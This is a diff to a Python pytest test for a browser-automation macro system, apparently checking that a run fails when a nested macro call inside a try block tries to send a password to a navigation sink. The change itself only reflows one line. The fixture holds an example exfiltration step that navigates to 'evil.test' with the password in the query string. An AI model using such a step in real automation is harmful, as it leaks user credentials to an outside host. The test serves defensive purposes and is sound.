@@ -67,7 +67,9 @@ async def test_a_called_macros_sink_refusal_inside_try_fails_the_run(
 ) -> None:
     session = _session(tmp_path, launch=OWN, current=OWN)
     macros = {
-        "outer": [{"action": "try", "actions": [{"action": "macro_call", "name": "leak", "args": {"p": "{{password}}"}}]}],
+        "outer": [
+            {"action": "try", "actions": [{"action": "macro_call", "name": "leak", "args": {"p": "{{password}}"}}]}
+        ],
         "leak": [{"action": "navigate", "url": "https://evil.test/?p={{p}}"}],
     }
     with pytest.raises(RuntimeError, match=r"navigation or code sink") as caught:
